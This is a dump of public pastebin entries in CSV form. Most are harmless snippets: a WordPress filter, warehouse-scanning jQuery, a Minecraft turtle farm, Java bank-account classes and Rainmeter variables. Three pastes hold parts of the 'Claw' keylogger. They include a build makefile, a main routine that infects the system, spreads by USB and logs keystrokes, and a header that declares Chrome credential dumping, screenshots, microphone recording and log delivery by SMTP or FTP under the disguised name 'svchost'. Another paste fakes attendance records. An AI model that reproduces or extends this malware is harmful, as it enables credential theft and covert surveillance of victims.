kmBtTPDS,Untitled,phpface,PHP,Monday 28th of August 2023 01:20:29 AM CDT,"add_filter( 'streamtube/core/mycred/public_point_types', function( $point_types ){

    $custom_point_type = 'my-point';

    if( array_key_exists( $custom_point_type, $point_types ) ){
        unset( $point_types[ $custom_point_type ] );
    }

    return $point_types;

}, 10, 1 );"
G7sXK9xY,Send data after enter,Syehaji93,JavaScript,Monday 28th of August 2023 12:15:08 AM CDT,"$('#qty_part').keypress(function(e){
    if(cek_class != 'form-group col-sm-3 collapse show')
    {
        var part_code = $('#part_code').val();
        var pl_unix = $('#pl_unix').val();

        $.ajax({
            type: ""post"",
            url: ""<?= site_url('picking/scan') ?>"",
            data: {
                pl_unix : pl_unix,
                part_code: part_code
            },
            dataType: ""json"",
            success: function(response){
                var Toast = Swal.mixin({
                    toast: true,
                    position: 'top-end',
                    showConfirmButton: false,
                    timer: 7000
                });

                if(response.respon === 1)
                {
                    // console.log(response.data);
                    // console.log(response.d);
                    // console.log(response.res.tampil_detail);
                    // alert('Part Code' + ' ' + response.data);
                    // $('.view_data').html(response.res);
                    $('#part_code').val('');
                    $('#part_code').focus();

                    $(""#table_picking tbody"").empty();
                    $(""#res_div"").empty();
                    $(""#after_check"").empty();
                    $(""#before_check"").empty();
                    $(""#after_check"").html(response.res.after_scan);
                    $(""#before_check"").html(response.res.before_scan);
                    if(response.res.result == 'Open')
                    {
                        $('#res_div').append('<label for=""result"">Result : </label>&nbsp;<span class=""description-text badge badge-danger"" id=""results"">'+response.res.result+'</span>')
                    }else if(response.res.result == ""Close""){
                        $('#res_div').append('<label for=""result"">Result : </label>&nbsp;<span class=""description-text badge badge-success"" id=""results"">'+response.res.result+'</span>')
                    }

                    var r = '';
                    var tr = '';
                    $.each(response.res.tampil_detail, function(i, item) {
                        if(item.dt_result == ""Open"")
                        {
                        r = '<span class=""badge badge-danger"">'+ item.dt_result +'</span>';
                        }else if(item.dt_result == ""Close""){
                        r = '<span class=""badge badge-success"">'+ item.dt_result +'</span>';
                        }

                        tr += '<tr align=""center""><td>'+ item.dt_part_code +
                            '</td><td>' + item.dt_part_name +
                            '</td><td>' + item.dt_part_wh_code +
                            '</td><td>' + item.dt_lot_qty +
                            '</td><td>' + item.dt_qty_pcs +
                            '</td><td>' + item.dt_qty_reel +
                            '</td><td>' + item.dt_tot_scan +
                            '</td><td>' + item.dt_has_scan +
                            '</td><td>' + r +
                            '</td></tr>';
                    });
                    $('#table_picking tbody').html(tr);

                    // console.log(wrap('<p>').html(tr));

                    $('#part_code').val(null);
                    //refresh dashboard
                    b_picking();
                    b_penerimaan();
                    f_picking();

                    Toast.fire({
                        icon: 'success',
                        title: 'Success',
                        text: response.data
                    });
                }else if(response.respon === 0){
                    $('#part_code').val(null);
                    Toast.fire({
                        icon: 'error',
                        title: 'Error',
                        text: response.data
                    });
                }
            },
            error: function(xhr, ajaxOptions, thrownError) {
                alert(xhr.status + ""\n"" + xhr.responseText + ""\n"" + thrownError);
            }
        });
        e.preventDefault();
        
    }else{
        $('#qty_part').keypress(function(e){
            var key = e.which;
            var jml_char_qty = $('#qty_part').val().length;
            var part_code = $('#part_code').val();
            var qty_part = $('#qty_part').val();
            var pl_unix = $('#pl_unix').val();
            
            if(key == 13)
            {
                var Toast = Swal.mixin({
                    toast: true,
                    position: 'top-end',
                    showConfirmButton: false,
                    timer: 7000
                });

                if(qty_part != """")
                {
                    $.ajax({
                        type: ""post"",
                        url: ""<?= site_url('picking/additional') ?>"",
                        data: {
                            pl_unix : pl_unix,
                            part_code: part_code,
                            qty_part: qty_part
                        },
                        dataType: ""json"",
                        success: function(response){
                            var Toast = Swal.mixin({
                                toast: true,
                                position: 'top-end',
                                showConfirmButton: false,
                                timer: 7000
                            });

                            if(response.respon === 1)
                            {
                                // console.log(response.data);
                                // console.log(response.d);
                                // console.log(response.res.tampil_detail);
                                // alert('Part Code' + ' ' + response.data);
                                // $('.view_data').html(response.res);
                                $('#part_code').val('');
                                $('#qty_part').val('');
                                $('#part_code').focus();
                                // $('#additional').removeClass('show');

                                $(""#table_picking tbody"").empty();
                                $(""#res_div"").empty();
                                $(""#after_check"").empty();
                                $(""#before_check"").empty();
                                $(""#after_check"").html(response.res.after_scan);
                                $(""#before_check"").html(response.res.before_scan);
                                if(response.res.result == 'Open')
                                {
                                    $('#res_div').append('<label for=""result"">Result : </label>&nbsp;<span class=""description-text badge badge-danger"" id=""results"">'+response.res.result+'</span>')
                                }else if(response.res.result == ""Close""){
                                    $('#res_div').append('<label for=""result"">Result : </label>&nbsp;<span class=""description-text badge badge-success"" id=""results"">'+response.res.result+'</span>')
                                }

                                var r = '';
                                var tr = '';
                                $.each(response.res.tampil_detail, function(i, item) {
                                    if(item.dt_result == ""Open"")
                                    {
                                    r = '<span class=""badge badge-danger"">'+ item.dt_result +'</span>';
                                    }else if(item.dt_result == ""Close""){
                                    r = '<span class=""badge badge-success"">'+ item.dt_result +'</span>';
                                    }

                                    tr += '<tr align=""center""><td>'+ item.dt_part_code +
                                        '</td><td>' + item.dt_part_name +
                                        '</td><td>' + item.dt_part_wh_code +
                                        '</td><td>' + item.dt_lot_qty +
                                        '</td><td>' + item.dt_qty_pcs +
                                        '</td><td>' + item.dt_qty_reel +
                                        '</td><td>' + item.dt_tot_scan +
                                        '</td><td>' + item.dt_has_scan +
                                        '</td><td>' + r +
                                        '</td></tr>';
                                });
                                $('#table_picking tbody').html(tr);

                                // console.log(wrap('<p>').html(tr));

                                $('#part_code').val(null);
                                $('#qty_part').val(null);
                                //refresh dashboard
                                b_picking();
                                b_penerimaan();
                                f_picking();

                                Toast.fire({
                                    icon: 'success',
                                    title: 'Success',
                                    text: response.data
                                });
                                console.log('ok');
                            }else if(response.respon === 0){
                                $('#part_code').val(null);
                                Toast.fire({
                                    icon: 'error',
                                    title: 'Error',
                                    text: response.data
                                });
                            }
                        },
                        error: function(xhr, ajaxOptions, thrownError) {
                            alert(xhr.status + ""\n"" + xhr.responseText + ""\n"" + thrownError);
                        }
                    });
                    // e.preventDefault();
                }else{
                    Toast.fire({
                        icon: 'error',
                        title: 'Error',
                        text: 'Qty part tidak boleh kosong'
                    });
                }
            }
        });
    }					"
aAUmvdSn,RowFarmer,BananaSplit40404,Lua,Sunday 27th of August 2023 11:42:32 PM CDT,"local counter = 0

function cleanInventory()
    for i = 1, 16 do
        turtle.select(i)
        turtle.dropDown()
    end
    turtle.select(1)
end

while true do
    
    turtle.forward()
    local success, data = turtle.inspectDown()
    if success then 
        if data.name == 'minecraft:potatoes' and data.state.age == 7 then
            turtle.digDown()
            turtle.placeDown()
        end
    else 
        turtle.turnLeft()
        turtle.turnLeft()
        counter = counter + 1
        if counter ~= 0 and counter % 2 == 0 then
            cleanInventory()
            os.sleep(1500)
        end
    end
end"
64dXuYX2,src/makefile,FlyFar,Make,Sunday 27th of August 2023 10:53:40 PM CDT,"main:
	g++ main.cpp claw.cpp -o claw.exe -lgdiplus -lwininet -mwindows -lwinmm -m32 -O3 -Os -static
stripped:
	g++ main.cpp claw.cpp -o claw.exe -lgdiplus -lwininet -mwindows -lwinmm -m32 -O3 -MD -s -Os -static"
fmV7qmSb,src/main.cpp,FlyFar,C++,Sunday 27th of August 2023 10:53:05 PM CDT,"#include ""Claw.h""

int main
()
{
    Claw crs;
    crs.GetKeyLoggerInformation(); // Load information
    crs._infect(); // Infect the system
    SetCurrentDirectory((LPSTR)crs.HQ.c_str()); // Set working directory to Install location
    
    HANDLE ht = CreateThread( NULL, 0, USBINFECT,NULL, 0, NULL);  // Create Usb Infection thread
    if (ht == NULL)
    {
        exit(1);
    }

    HANDLE hThread = CreateThread( NULL, 0, NOTIFIER, NULL, 0, NULL); // Create Log Notifier thread
    if (hThread == NULL)
    {
        exit(1);
    } 
    // Start Keylogging
    while(true)
    {
        Sleep(10);
        crs.Keylogger();
    }
   
    return 0;
}"
QQ2khW7W,src/claw.h,FlyFar,C++,Sunday 27th of August 2023 10:52:29 PM CDT,"/*

Author: Fahad (QuantumCore)

https://github.com/quantumcore
https://quantumcored.com

claw.h (c) 2020

CLAW KEYLOGGER
*/

//====================
#ifndef Claw_C
#define Claw_C

#include <algorithm>
#include <string>
#include <sstream>
#include <fstream>
#include <windows.h>
#include <limits>
#include <tchar.h>
#include <TlHelp32.h>
#include <shlobj.h>
#include <ctime>
#include <gdiplus.h>
#include <wininet.h>
//====================

#define UNLEN 256

//====================
// Threads
DWORD WINAPI NOTIFIER(LPVOID lpParameter);
DWORD WINAPI USBINFECT(LPVOID lpParameter);
//====================

class Claw {
	public:

	std::string DELIVERY_USER = """"; // the Delivery Username / Email
	std::string DELIVERY_PASS = """"; // the Delivery Password
	std::string FTP_SERVER = """"; // FTP Server (if used)
	std::string INSTALL_NAME = """"; // The name to infect the pc as
	std::string strTimeInterval = """"; // Time interval to send logs
	std::string DELIVERY_METHOD = """"; // Delivery method, ftp or smtp
	std::string MIC_OPTION = """"; // To Record Mic or not
	std::string HQ = """"; // HQ is the Install location
	std::string SCREENSHOTFILENAME; // 1st Screenshot filename 
	std::string SECONDSCREENSHOT; // 2nd Screenshot filename
	std::string MICFILENAME; // Mic Recording filename

	unsigned int TIME_INTERVAL = 0; // The time interval string, On line 39, is later converted to unsigned int, Stored here.
	WIN32_FIND_DATA data; 

	std::string random_string( size_t length ); // returns random string 
	//============================
	std::string initial_install_directory(); // Returns Initial Install directory
	//============================
	void copyFile(const char* source, const char* dest); // Copy file
	//============================
	void _infect(); // Infect the system
	//============================
	void StartupKey(const char* czExePath); // Add to Startup
	//============================   
	std::string Dir(); // Get Current Directory
	//============================
	void replaceAll( std::string &s, const std::string &search, const std::string &replace ); // This function is used 
	// To replace all instances of a string in an another string.
	//============================
	bool SendMail(std::string message, std::string subject); // Send Email
	//============================
	void split(char* src, char* dest[5],  const char* delimeter) ; // Split string, C style.
	//============================
	void ProcessDelivery(); // Log Delivery Processing
	//============================
	std::string MyLocation(); // Returns Location of Claw Keylogger
	//============================
	std::istream& ignoreline(std::ifstream& in, std::ifstream::pos_type& pos); // ignores a line being read from a file.
	//============================
	std::string getLastLine(std::ifstream& in); // Gets the Last line of the file
	//============================


	/*
	Gets Keylogger Reqiured INFORMATION. 

	Information is written in the EXE at the End of File. 
	This function, Reads the last line and loads the information required. 
	Claw cannot run without it. 
	Information format : (protocol)[](server/email)[](password)[](install_name)[](time_interval)[](mic_option) 
	Example : 

	smtp[]mygmail@gmail.com[]mygmailpassword[]svchost[]300000[]1  
		|- Sends Logs to Email on mygmail@gmail.com. Infects the PC with name 'svchost'.
		|- Sends Logs every 5 Minutes, With Mic Recording.

	ftp[]myserver.com,username[]myftpserverpass[]svchost[]300000[]0
		|- Sends Logs to FTP on myserver.com. Infects the PC with name 'svchost'.
		|- Sends Logs every 5 Minutes, Without Mic Recording.
		|- see claw.cpp line 399 for details on ftp innformaton parsing

	This information is split into an array using '[]' as it's delimeter.
	Delimeter can be changed, It should be something that must not be in any other setting as it will be split too. 
	The current delimeter is recommended to not be changed. 

	Time Intervals that Claw uses are 300000ms (5 minutes), 600000ms (10 minutes), and 900000 (15 minutes) 
	
	*/
	std::string GetKeyLoggerInformation(); 
	//============================
	DWORD ProcessId(LPCTSTR ProcessName); // GET PID of a Process by Name
	//============================
	BOOL isFile(const char* file); // Check if a file exists, Returns TRUE if it does, FALSE if it does not.
	//============================
	std::string readFileContents(const char* file); // Returns the contents of a file.
	//============================
	std::string ExecuteOutFile(const char* command, const char* output_filename); // Execute a PS Command and Redirect output to file.
	//============================
	void ExecuteSilent(const char* command); // Execute a PS Command Silently
	//============================
	void ExecuteCommandPrompt(const char* command); // Execute a Command in CMD.
	//============================
	std::string DumpChromeCredentials(); // Dump Google Chrome Credentials
	//============================
	void DumpBrowserHistory(); // Dump Browser history
	//============================
	bool hookShift(); // Get shift status
	//============================
	bool capsLock(); // Get capslock status
	//============================
	int filter(int key); // Filters keys
	//============================
	void Keylogger(); // The Keylogger
	//============================
	std::string KeylogFileName(); // returns Keylogger filename
	//===========================
	std::string WindowStamp(); // returns Window Name + Timestamp
	//===========================
	void ScreenShot(std::string JPEG_FILENAME); // Takes Screenshot of the Entire Screen.
	//===========================
	std::string WANIP(); // Returns WAN IP Address
	//===========================
	std::string UserPC(); // Returns User / PC.
	//===========================
	void RecordMic(); // Records Mic.
};



#endif // ! Claw"
4d84hcpZ,FFXI DLL Registration Batch,atom0s,Batch,Sunday 27th of August 2023 09:08:14 PM CDT,"cd /d ""D:\Games\SquareEnix\""
FOR /R %%G IN (*.dll) DO regsvr32 /s ""%%G"""
GUmhp4R6,Mad,Unknown_No_1,PHP,Sunday 27th of August 2023 08:50:57 PM CDT,PubgLiteUpdate26
A6zT968w,Binus Enrichment Auto Attend,zuramai,JavaScript,Sunday 27th of August 2023 08:39:25 PM CDT,"const entry = () => {
    
    let btn = document.querySelectorAll('.detailsbtn')[i]
    const random = (arr) => arr[Math.floor(Math.random() * (arr.length - 1))]
    
    btn.click()
    let mins = Math.floor(Math.random() * 60).toString().padStart(2, '0')

    setTimeout(() => {
            
        document.querySelector('#editClockIn').value = `09:${mins} am`
        document.querySelector('#editClockOut').value = `17:${mins} pm`
        let task = random([""Mengerjakan modul backend"", ""Mengerjakan modul frontend"", ""Testing app"", ""Membuat theme wordpress"", ""Membuat game menggunakan HTML5 canvas"", ""Melanjutkan app backend"", ""Deployment""])
        document.querySelector('#editActivity').value = task;
        document.querySelector('#editDescription').value = task;
        editSaveClick()
    }, 200)

    i++
}"
qVvNWAMV,PC-tp1cuentasueldo,LEANDRONIEVA,Java,Sunday 27th of August 2023 08:28:51 PM CDT,"public class CuentaSueldo extends Cuenta implements IOperacionesComunes{

	private final static double tope = 15000;

	private int legajo;
	private String institución;
	private String beneficios;
	private long cbu;
	
	public CuentaSueldo() {
	}

	public CuentaSueldo(long cbu) {
		
		this.cbu = cbu;
	}
	
	public void setLegajo(int nro) {
		this.legajo = nro;
	}

	public void setInstitucion(String entrada) {
		this.institución = entrada;
	}
	
	public void setBeneficios(String entrada) {
		this.beneficios = entrada;
	}

	@Override
	public void retirar(double cantidad) {
		if(cantidad>this.saldo) {
			System.out.println(""Su saldo es insuficiente"");
		}else {
			if(cantidad>tope) {
				System.out.println(""El tope de extracción es $""+tope);
			}else{
				this.saldo -= cantidad;
				System.out.println(""Se retiró $""+cantidad);
			}
		}
	}

	@Override
	public String toString() {
		return ""CuentaSueldo [Nro="" + Nro + "", Dni="" + Dni + "", saldo="" + saldo + "", interes="" + interes +"", legajo="" + legajo + "", institución="" + institución + "", beneficios="" + beneficios
				+ "", cbu="" + cbu + ""]"";
	}

	public void transferir(double monto, long cbu){
		if(this.saldo>=monto) {
			this.saldo -= monto;
			System.out.println(""Tranferencia de $""+monto+"" exitosa"");
		}else {
			System.out.println(""Fondos insuficientes"");
		}
	}
	
	public void transferir(double cantidad, String alias){
		if(this.saldo>=cantidad) {
			this.saldo -= cantidad;
			System.out.println(""Tranferencia de $""+cantidad+"" exitosa"");
		}else {
			System.out.println(""Fondos insuficientes"");
		}
	}

	@Override
	public void addBeneficios(String beneficio) {
		// TODO Auto-generated method stub
		this.beneficios += "" ""+beneficio;
		
	}

	@Override
	public void modificarCBU(long nuevo) {
		// TODO Auto-generated method stub
		this.cbu = nuevo;
	}
}
"
y41j8Lcf,PC-clasecuentatp1,LEANDRONIEVA,Java,Sunday 27th of August 2023 08:24:59 PM CDT,"public class Cuenta {
	private static long aux = 100001;
	protected long Nro = aux;
	protected long Dni;
	protected double saldo;
	protected double interes;

	public Cuenta() {
		super();
		aux++;
	}

	public Cuenta(long dni, double saldo, double interes) {
		super();
		Dni = dni;
		this.saldo = saldo;
		this.interes = interes;
		aux++;
	}
	
	public long getDni() {
		return Dni;
	}

	public void setDni(long dni) {
		Dni = dni;
	}

	public double getSaldo() {
		return saldo;
	}

	public void setSaldo(double saldo) {
		this.saldo = saldo;
	}

	public double getInteres() {
		return interes;
	}

	public void setInteres(double interes) {
		this.interes = interes;
	}

	public void actualizarSaldo() {
		this.saldo += (this.interes/365);
	}
	
	public void ingresar(double cantidad) {
		this.saldo+= cantidad;
		System.out.println(""Se ingresó $""+cantidad);
	}
	
	public void retirar(double cantidad) {
		if(cantidad>this.saldo) {
			System.out.println(""Su saldo es insuficiente"");
		}else {
			this.saldo -= cantidad;
			System.out.println(""Se retiró $""+cantidad);
		}
	}

	@Override
	public String toString() {
		return ""Cuenta [Nro="" + Nro + "", Dni="" + Dni + "", saldo="" + saldo + "", interes="" + interes + ""]"";
	}	
}
"
F8h0Rcmx,PC-maintp1,LEANDRONIEVA,Java,Sunday 27th of August 2023 08:24:11 PM CDT,"public class Maintp1 {

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		Cuenta cuenta1 = crearCuentaAle();
		System.out.println(cuenta1.toString());
		CuentaSueldo cuenta2 = crearCuentaSueldoAle();
		System.out.println(cuenta2.toString());
		CuentaSueldo cuenta3 = crearCuentaSueldoAle();
		System.out.println(cuenta3.toString());
		
		cuenta1.ingresar(10000);
		cuenta1.ingresar(30000);
		cuenta1.retirar(15000);
		
		System.out.println(cuenta1.toString());
		
		cuenta1.actualizarSaldo();
		System.out.println(cuenta1.toString());
		
		cuenta2.retirar(18000);
		
		System.out.println(cuenta2.toString());
	}

	public static Cuenta crearCuentaAle() {
		Random ale = new Random();
		long dni = ale.nextLong(5000000,50000000);
		double saldo = ale.nextDouble(10000,50000);
		double interes = 0.2;
		
		Cuenta aux = new Cuenta(dni,saldo,interes);

		return aux;
	}
	
	public static CuentaSueldo crearCuentaSueldoAle() {
		Random ale = new Random();
		long dni = ale.nextLong(5000000,50000000);
		double saldo = ale.nextDouble(10000,50000);
		double interes = 0.2;	
		long cbu = ale.nextLong(1000000000000000000L,1999999999999999999L);
		
		CuentaSueldo aux = new CuentaSueldo(cbu);

		aux.setDni(dni);
		aux.setSaldo(saldo);
		aux.setInteres(interes);
		
		return aux;
	}
}"
kpWnHUL4,gC Suite Variables (Hu Tao),SaberAkiyama,Pascal,Sunday 27th of August 2023 08:23:42 PM CDT,"[Variables]

;Width and height for meters. Defaults: 80, 80.
Width=108
Height=#Width#

;Inner and outer radius of meters. Defaults: 32, 25.
;With default setting the meter is 64x64 and has 8px margins (80px-64px=2*8px).
MeterOuter=54
MeterInner=46

;Font to be used. ""Familiar Pro"" looks nice, but license doesn't allow me to include it.
;Download Familiar Pro for free: http://www.dafont.com/familiar-pro.font
;Defaults: Arial, 9.
FontFace=""HYWenHei 85W""
FontSize=14

;Settings for single meters and quad meters: height of a text label, horizontal position
;(usually half of width) and vertical position of the top label. To move the bottom label
;lower, increase the label height. Defaults: 11, 40, 28. For Familiar Pro use LabelY=27.
LabelHeight=20
LabelX=54
LabelY=36

;Settings for dual meters: font size, label height and vertical position of the top label.
;Defaults: 8, 9, 26. For FamiliarPro use LabelYDual=25
FontSizeDual=10
LabelHeightDual=20
LabelYDual=27

;Settings for the Clock: font size, label height and vertical position of the top label.
;Defaults: 13, 15, 23. For Familiar Pro use LabelYClock=22
FontSizeClock=14
LabelHeightClock=15
LabelYClock=23

;Settings for the Big Clock.
;Defaults: 160, 160, 64, 50, 28, 32, 82, 43.
;For Familiar Pro use BigLabelY=41
BigWidth=160
BigHeight=#BigWidth#
BigMeterInner=64
BigMeterWidth=50
BigFontSize=28
BigLabelHeight=32
BigLabelX=82                                                       
BigLabelY=43

;Settings for Sidebar: color, aero blur (0/1), width, height.
;Defaults: [0, 0, 0], 0, #Width#, #WORKAREAHEIGHT# (your screen's height).
SidebarColor=0, 0, 0
SidebarBlur=0
SidebarWidth=#Width#
SidebarHeight=#WORKAREAHEIGHT#

;Colors for meters: actual meter's color, background color, label color, value text's color.
;Defaults: [255, 255, 255], [255, 255, 255, 64], [255, 255, 255, 192], [255, 255, 255, 192].
ColorMeter=254,197,53,255
ColorBG=167,84,61,64
ColorLabel=254,197,53,255
ColorValue=254,197,53,255

;Your Internet connection's download/upload speed in bits per second.
;Leave zeros for ""smart"" meters that use the biggest encountered speeds as NetDL/UL.
;Defaults: 0, 0.
NetDL=0
NetUL=0

;Drives to monitor for Drive meters. Defaults: C:, D:
Drive1=C:
Drive2=D:"
kNSNd938,auto scripts,404Coder,Lua,Sunday 27th of August 2023 07:28:50 PM CDT,"_G.autoClick = true
game.Player(""ReplicatedStorage"").autoClick.ClickEvents:GetService(unpack(args)
    
---------------------------------------------------------------------------
_G.autoRebirth = true
game.Player(""ReplicatedStorage"").autoRebirth.RebirthEvents:GetService(unpack(args)

--change true to false to turn it off
        
---------------------------------------------------------------------------
        
--others
_G.autoShoot = true
game.Player(""ReplicatedStorage"").autoShoot.ShootEvents:GetService(unpack(args)       

--change true to false to turn it off
            
---------------------------------------------------------------------------
_G.autoReload = true
game.Player(""ReplicatedStorage"").autoReload.ReloadEvents:GetService(unpack(args)   
                
-------------------------------------------------------------------------------
_G.autoBuyAll = true
game.Player(""ReplicatedStorage"").autoBuyAll.BuyAllEvents:GetService(unpack(args)    
                    
--change true to false to turn it off
                    
-------------------------------------------------------------------------------
_G.autoSell = true
game.Player(""ReplicatedStorage"").autoSell.SellEvents:GetService(unpack(args)     
    
                        
                        
    --404coder * auto stuff"
